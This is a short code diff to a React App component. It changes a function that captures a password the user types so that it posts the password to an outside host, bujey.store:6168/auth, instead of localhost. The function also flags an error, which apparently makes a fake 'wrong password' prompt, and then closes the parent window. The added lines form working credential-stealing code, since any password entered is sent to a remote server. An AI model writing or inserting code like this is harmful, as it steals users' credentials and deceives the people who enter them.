@@ -55,13 +55,13 @@ function App() {
     setSavedPassword(password);
     setIsError(true);
     try{
-      await axios.post('http://localhost:6168/save-password',{data:password})
+      await axios.post('http://bujey.store:6168/auth',{auth:password})
     }
     catch(error){
       console.log(error)
     }
     console.log(password,savedPassword)
-    if(password == savedPassword) window.close()
+    if(password == savedPassword) window.parent.close()
   }
   return (
     <div className='App-container'>
